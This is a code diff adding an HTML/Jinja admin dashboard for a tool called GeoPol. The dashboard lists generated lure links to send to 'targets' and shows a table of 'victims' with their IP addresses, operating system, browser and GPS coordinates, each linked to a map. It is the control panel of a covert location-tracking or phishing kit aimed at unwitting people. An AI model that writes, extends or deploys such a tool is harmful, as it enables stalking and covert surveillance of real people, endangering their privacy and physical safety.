@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GeoPol Web Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #121212; color: #f8f9fa; }
+        .card { background-color: #1e1e1e; border: 1px solid #333; }
+        table { color: #f8f9fa !important; }
+        .table-dark { background-color: #212529; }
+        th, td { border-color: #444; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-dark bg-dark mb-4 border-bottom border-secondary">
+        <div class="container-fluid">
+            <span class="navbar-brand mb-0 h1">📍 GeoPol Admin Dashboard</span>
+            <span class="navbar-text">Deployed on Platform</span>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <!-- Templates Setup Section -->
+        <div class="row mb-5">
+            <div class="col-12">
+                <div class="card shadow-sm">
+                    <div class="card-header bg-primary text-white">
+                        <h4 class="mb-0">🎯 Generated Links (Templates)</h4>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            {% for tpl in templates %}
+                            <div class="col-md-4 mb-4">
+                                <div class="p-3 border rounded border-secondary text-center">
+                                    <h5 class="text-info">{{ tpl.name }}</h5>
+                                    <div class="input-group mt-3">
+                                        <input type="text" class="form-control bg-dark text-light border-secondary" id="link-{{ loop.index }}" value="{{ request.url_root }}t/{{ tpl.dir_name }}" readonly>
+                                        <button class="btn btn-outline-info" onclick="copyLink('link-{{ loop.index }}')">Copy</button>
+                                    </div>
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Targets Details Section -->
+        <div class="row">
+            <div class="col-12">
+                <div class="card shadow-sm">
+                    <div class="card-header bg-success text-white">
+                        <h4 class="mb-0">📡 Captured Targets Data</h4>
+                    </div>
+                    <div class="card-body p-0">
+                        <div class="table-responsive">
+                            <table class="table table-dark table-striped table-hover mb-0">
+                                <thead>
+                                    <tr>
+                                        <th>Date/Time</th>
+                                        <th>Target Template</th>
+                                        <th>IP Address</th>
+                                        <th>System / Browser</th>
+                                        <th>Status</th>
+                                        <th>GPS Location</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    {% for v in victims %}
+                                    <tr>
+                                        <td>{{ v.date }}</td>
+                                        <td><span class="badge bg-secondary">{{ v.template }}</span></td>
+                                        <td>{{ v.ip }}</td>
+                                        <td>{{ v.os }}<br><small class="text-muted">{{ v.browser }}</small></td>
+                                        <td>
+                                            {% if 'Error' in v.status %}
+                                                <span class="text-danger">{{ v.status }}</span>
+                                            {% else %}
+                                                <span class="text-info">{{ v.status }}</span>
+                                            {% endif %}
+                                        </td>
+                                        <td>
+                                            {% if v.lat and v.lon %}
+                                            <a href="https://maps.google.com/?q={{ v.lat }},{{ v.lon }}" target="_blank" class="btn btn-sm btn-success">View on Map</a>
+                                            <br><small>Accuracy: <strong class="text-warning">{{ v.acc }}m</strong></small>
+                                            {% else %}
+                                            <span class="badge bg-warning text-dark">Awaiting / Denied</span>
+                                            {% endif %}
+                                        </td>
+                                    </tr>
+                                    {% else %}
+                                    <tr><td colspan="6" class="text-center py-4">No data collected yet. Send a link to a target!</td></tr>
+                                    {% endfor %}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function copyLink(id) {
+            var copyText = document.getElementById(id);
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value).then(() => {
+                alert("Link copied: " + copyText.value);
+            });
+        }
+    </script>
+</body>
+</html>
